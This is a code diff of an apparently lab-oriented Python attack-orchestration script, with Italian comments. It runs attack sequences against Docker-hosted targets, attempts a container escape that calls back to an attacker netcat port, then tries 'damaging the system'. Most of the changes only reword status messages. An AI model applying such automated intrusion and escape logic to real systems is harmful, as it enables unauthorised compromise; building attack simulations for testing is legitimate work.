@@ -34,7 +34,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
     #CASO 0: PROCEDURA IN ORDINE CASUALE
     if not attack_sequence_file:
-        print(f"{C.COL_GREEN}[+] No attack sequence file provided, proceeding with random attack sequence{C.COL_RESET}")
+        print(f"{C.COL_YELLOW}[*]\n Attacking with random attack sequence")
         
         #Vengono estratte ed attaccate, una ad una, tutte le macchine target
         while machines:
@@ -64,6 +64,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                 attack_name = attack_sequence_list[attack_sequence_index]
                 attack_sequence_index += 1
 
+                #LPORT = C.DEFAULT_LPORT 
                 LPORT = None
                 for p in C.TARGETS_DOCKERS[target_ip]:
                     LPORT = p["exposed_port"]
@@ -119,6 +120,8 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
 
     #CASO 1: PROCEDURA CON ORDINE LETTO DA FILE
     else:
+        print(f"{C.COL_YELLOW}[*]\n Reading attack sequence from Attack_sequence.json and attacking with that")
+        
         with open(attack_sequence_file) as f:
             attack_data = json.load(f)['attack_sequence']
 
@@ -189,14 +192,14 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                             escape = mc.docker_escape(docker_escape_attack_object)
                             if(escape):
-                                print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
+                                print(f"{C.COL_GREEN}docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
                             else:
                                 print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
                                 break  
 
                         break
                     else:
-                        print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
+                        print(f"{C.COL_YELLOW}[*]false positive occurred, ignoring... {C.COL_RESET}")
 
                 else:
                     uncompromised_machines.add(target_ip)
@@ -223,8 +226,6 @@ if(__name__=='__main__'):
        if(mode!=0 and mode!=1):
            print("Invalid choice, press 0 or 1")
    if(mode==0):
-       print("\nAttacking with random attack sequence")
        main_procedure(C.ATTACKER_VM,"config.json")
    else:
-       print("\nReading attack sequence from Attack_sequence.json and attacking with that")
        main_procedure(C.ATTACKER_VM,"config.json", "Attack_sequence2.json")
